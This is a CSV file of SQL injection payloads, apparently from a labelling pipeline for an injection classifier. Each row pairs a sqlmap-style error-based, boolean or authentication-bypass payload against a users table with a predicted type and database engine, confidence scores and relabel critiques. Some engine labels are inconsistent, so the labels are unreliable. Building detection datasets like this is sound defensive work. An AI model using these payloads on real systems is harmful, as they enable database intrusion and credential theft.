payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users WHERE username = ""1\'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-7209\' ) ) ) and ( ( ( \'stqx\' = \'stqx""",error_based,oracle,0.9,dbms_utility.sqlid_to_sqlhash,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,37600,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"select * from users WHERE username = ""1\'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-7209\' ) ) ) and ( ( ( \'stqx\' = \'stqx"""
"select * from users WHERE username = ""1\'+ ( select \'rejz\' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-3729\' ) ) and ( ( \'czed\' = \'czed""",error_based,oracle,0.9,dbms_utility.sqlid_to_sqlhash,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,37601,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"select * from users WHERE username = ""1\'+ ( select \'rejz\' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-3729\' ) ) and ( ( \'czed\' = \'czed"""
"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) and ( ( \'yhku\' like \'yhku""",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,37602,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) and ( ( \'yhku\' like \'yhku"""
"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 and username = ""-5585\' and username = ""1%\' )",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,37603,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 and username = ""-5585\' and username = ""1%\' )"
"select * from users WHERE username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 9932 = 9932"" and username = ""-2374 ) and ( 2576 = 2576""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37604,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 9932 = 9932"" and username = ""-2374 ) and ( 2576 = 2576"""
"select * from users WHERE username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso"" or username = ""1\' and \'ixzr\' = \'ixzr""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,37605,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso"" or username = ""1\' and \'ixzr\' = \'ixzr"""
"select * from users WHERE username = ""1\' ) ) and username = ""-8828%\' ) ) ) or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,37606,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) ) and username = ""-8828%\' ) ) ) or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"""
"select * from users WHERE username = ""1 ) ) ) and ( ( ( 3505 = 3505"" or username = ""1\' where 2389 = 2389 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37607,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1 ) ) ) and ( ( ( 3505 = 3505"" or username = ""1\' where 2389 = 2389 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"select * from users WHERE username = ""-1254"" and username = ""1 ) and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37608,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-1254"" and username = ""1 ) and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"select * from users WHERE username = ""-7209\' ) ) ) or username = ""-1254"" or username = ""-7209\' ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,37609,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-7209\' ) ) ) or username = ""-1254"" or username = ""-7209\' ) ) )"
"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37610,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-9501\' ) and ( \'mndw\' = \'mndw"" and ( ( 3318 = 3318""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37611,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-9501\' ) and ( \'mndw\' = \'mndw"" and ( ( 3318 = 3318"""
"select * from users WHERE username = ""-7720 ) ) and ( ( 8254 = 8254"" and username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37612,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-7720 ) ) and ( ( 8254 = 8254"" and username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"select * from users WHERE username = ""1\'|| ( select \'rjun\' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" or username = ""-1854\' ) as fmmq where 7326 = 7326",error_based,postgresql,0.85,char for PostgreSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,37613,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\'|| ( select \'rjun\' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" or username = ""-1854\' ) as fmmq where 7326 = 7326"
